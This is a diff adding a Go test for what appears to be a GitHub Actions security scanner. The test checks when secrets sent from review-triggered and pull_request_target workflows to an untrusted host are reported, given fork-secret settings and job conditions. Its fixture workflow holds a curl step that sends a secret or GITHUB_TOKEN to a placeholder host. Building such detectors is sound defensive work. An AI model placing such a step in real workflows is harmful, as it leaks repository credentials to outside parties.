@@ -183,3 +183,73 @@ func TestExfiltrationFingerprintPerStep(t *testing.T) {
 		}
 	}
 }
+
+// forkSecrets is an entry of a file of facts that answers
+// repo.fork-pr-secrets.
+func forkSecrets(v bool) string {
+	b := "false"
+	if v {
+		b = "true"
+	}
+	return `{"query":{"kind":"repo.fork-pr-secrets"},"state":"found","value":` + b + `}`
+}
+
+// TestSecretExfiltrationForkPullRequest: a job on pull_request_review or
+// pull_request_review_comment whose if keeps out every run for a pull
+// request from a branch of the repository reports a secret only where the
+// settings send secrets to the runs for pull requests from forks
+// (repo.fork-pr-secrets), conditionally when that is not known, as a job
+// on pull_request does; an if that lets such a branch in, no if,
+// pull_request_target, and GITHUB_TOKEN keep the finding whatever the fact
+// says.
+func TestSecretExfiltrationForkPullRequest(t *testing.T) {
+	wf := func(on, cond, sent string) map[string]string {
+		ifLine := ""
+		if cond != "" {
+			ifLine = "    if: " + cond + "\n"
+		}
+		return wfFile("on: " + on + "\njobs:\n  j:\n" + ifLine + "    runs-on: ubuntu-latest\n    env:\n      T: ${{ secrets.T }}\n    steps:\n      - run: |\n          curl -H \"A: " + sent + "\" https://api.example.com/x\n")
+	}
+	const fork, name = "github.event.pull_request.head.repo.fork", "github.event.pull_request.head.repo.full_name != github.repository"
+	untrusted := trusted("T", "api.example.com", false)
+	for _, on := range []string{"pull_request_review", "pull_request_review_comment"} {
+		for _, cond := range []string{fork, name, "github.event.pull_request.head.repo.fork == true && github.event.review.state == 'approved'"} {
+			files := wf(on, cond, "$T")
+			if got := exfilResults(t, exfilRules, files, exfilStore(t, untrusted, forkSecrets(false))); len(got) != 0 {
+				t.Errorf("%s, %s, fact false: %q", on, cond, got)
+			}
+			if got, want := exfilResults(t, exfilRules, files, exfilStore(t, untrusted, forkSecrets(true))), []string{"untrusted-destination T api.example.com confirmed"}; !slices.Equal(got, want) {
+				t.Errorf("%s, %s, fact true: got %q, want %q", on, cond, got, want)
+			}
+			if got, want := exfilResults(t, exfilRules, files, exfilStore(t, untrusted)), []string{"untrusted-destination T api.example.com conditional"}; !slices.Equal(got, want) {
+				t.Errorf("%s, %s, fact unknown: got %q, want %q", on, cond, got, want)
+			}
+		}
+		for _, cond := range []string{"", fork + " || github.event.review.state == 'approved'", "!" + fork, "github.event.pull_request.head.repo.full_name == github.repository"} {
+			if got, want := exfilResults(t, exfilRules, wf(on, cond, "$T"), exfilStore(t, untrusted, forkSecrets(false))), []string{"untrusted-destination T api.example.com confirmed"}; !slices.Equal(got, want) {
+				t.Errorf("%s, %q: got %q, want %q", on, cond, got, want)
+			}
+		}
+		token := wf(on, fork, "${{ github.token }}")
+		if got, want := exfilResults(t, exfilRules, token, exfilStore(t, trusted("GITHUB_TOKEN", "api.example.com", false), forkSecrets(false))), []string{"untrusted-destination GITHUB_TOKEN api.example.com confirmed"}; !slices.Equal(got, want) {
+			t.Errorf("%s, token: got %q, want %q", on, got, want)
+		}
+	}
+	// a review event with pull_request is read as each of them alone
+	for _, on := range []string{"[pull_request_review, pull_request]", "[pull_request_review_comment, pull_request_review]"} {
+		files := wf(on, fork, "$T")
+		if got := exfilResults(t, exfilRules, files, exfilStore(t, untrusted, forkSecrets(false))); len(got) != 0 {
+			t.Errorf("%s, fact false: %q", on, got)
+		}
+		if got, want := exfilResults(t, exfilRules, files, exfilStore(t, untrusted, forkSecrets(true))), []string{"untrusted-destination T api.example.com confirmed"}; !slices.Equal(got, want) {
+			t.Errorf("%s, fact true: got %q, want %q", on, got, want)
+		}
+	}
+	// the run of pull_request_target for a pull request from a fork has the
+	// secrets, and so has a workflow that adds it to a review event
+	for _, on := range []string{"pull_request_target", "[pull_request_review, pull_request_target]"} {
+		if got, want := exfilResults(t, exfilRules, wf(on, fork, "$T"), exfilStore(t, untrusted, forkSecrets(false))), []string{"untrusted-destination T api.example.com confirmed"}; !slices.Equal(got, want) {
+			t.Errorf("%s: got %q, want %q", on, got, want)
+		}
+	}
+}
